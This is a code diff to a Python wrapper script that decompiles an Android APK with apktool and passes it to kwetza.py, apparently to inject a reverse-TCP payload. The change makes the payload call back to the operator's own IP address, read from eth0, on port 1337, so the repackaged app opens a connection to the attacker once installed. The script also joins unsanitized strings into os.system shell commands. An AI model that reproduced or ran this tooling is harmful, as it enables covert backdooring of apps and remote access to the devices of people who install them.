@@ -9,6 +9,9 @@ soup    = ""
 folder  = ""
 appname = ""
 main    = ""
+IP      = ""
+PORT    = ""
+TYPE    = ""
 
 def findPackage():
     #os.system('apktool --version')
@@ -51,9 +54,16 @@ def changeToFolder(string):
     return string.replace('.', '/')
 
 def callKwetza():
-    os.system('python kwetza.py ' + appname + ' tcp 1.1.1.1 1337 ' + main)
+    global IP
+    IP = IP.replace('\r','').replace('\n','')
+    os.system('python kwetza.py ' + appname + ' tcp '+IP+' 1337 ' + main)
+
+def getIP():
+    global IP
+    IP = os.popen("ifconfig eth0 | grep 'inet ' | awk -F'[: ]+' '{print $3}'").read()
 
 def init():
+    getIP()
     command = ["apktool", "d", "-f", sys.argv[1]]
     cmd = subprocess.Popen(command, stdout=subprocess.PIPE)
     while True:
